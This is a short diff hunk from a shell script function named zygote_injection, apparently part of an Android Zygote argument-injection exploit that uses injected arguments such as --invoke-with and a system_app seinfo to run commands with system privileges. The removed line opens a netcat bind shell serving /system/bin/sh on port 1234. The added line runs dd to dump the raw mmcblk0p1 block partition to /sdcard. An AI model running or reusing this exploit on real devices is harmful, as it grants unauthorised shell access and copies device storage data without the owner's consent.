@@ -116,7 +116,7 @@ zygote_injection() {
 --nice-name=runnetcat
 --seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete
 --invoke-with
-toybox nc -s 192.168.117.206 -p 1234 -L /system/bin/sh -l;
+/system/bin/sh -c "dd if=/dev/block/mmcblk0p1 of=/sdcard/mmcblk0p1.img bs=4M"
 "\n' "$uid" "$uid" "$NC_PORT"
 }
 
